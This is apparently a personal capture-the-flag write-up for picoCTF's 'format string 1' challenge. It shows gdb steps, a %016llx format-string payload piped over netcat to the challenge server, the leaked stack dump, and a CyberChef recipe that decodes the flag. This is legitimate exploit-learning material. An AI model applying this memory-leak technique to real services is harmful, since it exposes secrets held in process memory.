I actually know this is a [printf format string](https://owasp.org/www-community/attacks/Format_string_attack) attack because I got stuck on the [Stonks](https://play.picoctf.org/practice?page=1&search=stonks&solved=0) problem in the picoCTF gym.  You can see me fail in [this](https://youtu.be/6hXvSzChOrI) YouTube view.

With some help from the [Legacy Code Rocks](https://legacycode.rocks/) community we figured out it was a format string error but I couldn't figure out the correct payload to solve Stonks and I'm also struggling with this one.

After some guessing of `%x.%x.%s` strings I ended up installing gdb.  You can also use [OnlineGDB](https://www.onlinegdb.com/).

Create the `flag.txt`, `secret-menu-items-1.txt`, and `secret-menu-item-2.txt` and fill them with some text.  Then I ran:

```
gdb format-string-1
```

The entry point is `0x401110` which I got from running:

```
(gdb) info file
Symbols from "/home/localadmin/Documents/picoCTF2024/format_string_1/format-string-1".
Native process:
        Using the running image of child Thread 0x7ffff7dc8740 (LWP 5982).
        While running this, GDB does not access memory from...
Local exec file:
        `/home/localadmin/Documents/picoCTF2024/format_string_1/format-string-1', file type elf64-x86-64.
        Entry point: 0x401110
        0x0000000000400318 - 0x0000000000400334 is .interp
        <more memory mapping>

```

Put a brakepoint in the application:

```
b main
```

Then view the assembly code:

```
layout asm
```

main = 0x4011f6

Actually, ignore the above.  To solve the problem I would run the `%08x` but that wouldn't print off the entire values.  I could find some of the flag, or other strings I added, but not the enitre one.

The fix was to use the `%016llx` which prints can handle long long values as the binary is 64bit.

```
python3 payload.py | nc mimas.picoctf.net 60871
Give me your order and I'll read it back to you:
Here's your order: AA0000000000402118,0000000000000000,00007F07DD584A00,0000000000000000,00000000005BE880,000000000A347834,00007FFE3BD32DD0,00007F07DD375E60,00007F07DD59A4D0,0000000000000001,00007FFE3BD32EA0,0000000000000000,0000000000000000,7B4654436F636970,355F31346D316E34,3478345F33317937,34365F673431665F,007D363131373732,0000000000000007,00007F07DD59C8D8,0000002300000007,206E693374307250,00000A336C797453,0000000000000009,00007F07DD5ADDE9,00007F07DD37E098,00007F07DD59A4D0,0000000000000000,00007FFE3BD32EB0,6C6C363130254141,6C6C363130252C58,6C6C363130252C58,
Bye!
```

Putting the above in Cyber Chef and using Swap endianness and From Hex shows the key.

https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',8,true)From_Hex('Auto')&input=MDAwMDAwMDAwMDQwMjExOCwwMDAwMDAwMDAwMDAwMDAwLDAwMDA3RjA3REQ1ODRBMDAsMDAwMDAwMDAwMDAwMDAwMCwwMDAwMDAwMDAwNUJFODgwLDAwMDAwMDAwMEEzNDc4MzQsMDAwMDdGRkUzQkQzMkREMCwwMDAwN0YwN0REMzc1RTYwLDAwMDA3RjA3REQ1OUE0RDAsMDAwMDAwMDAwMDAwMDAwMSwwMDAwN0ZGRTNCRDMyRUEwLDAwMDAwMDAwMDAwMDAwMDAsMDAwMDAwMDAwMDAwMDAwMCw3QjQ2NTQ0MzZGNjM2OTcwLDM1NUYzMTM0NkQzMTZFMzQsMzQ3ODM0NUYzMzMxNzkzNywzNDM2NUY2NzM0MzE2NjVGLDAwN0QzNjMxMzEzNzM3MzIsMDAwMDAwMDAwMDAwMDAwNywwMDAwN0YwN0RENTlDOEQ4LDAwMDAwMDIzMDAwMDAwMDcsMjA2RTY5MzM3NDMwNzI1MCwwMDAwMEEzMzZDNzk3NDUzLDAwMDAwMDAwMDAwMDAwMDksMDAwMDdGMDdERDVBRERFOSwwMDAwN0YwN0REMzdFMDk4LDAwMDA3RjA3REQ1OUE0RDAsMDAwMDAwMDAwMDAwMDAwMCwwMDAwN0ZGRTNCRDMyRUIwLDZDNkMzNjMxMzAyNTQxNDEsNkM2QzM2MzEzMDI1MkM1OCw2QzZDMzYzMTMwMjUyQzU4

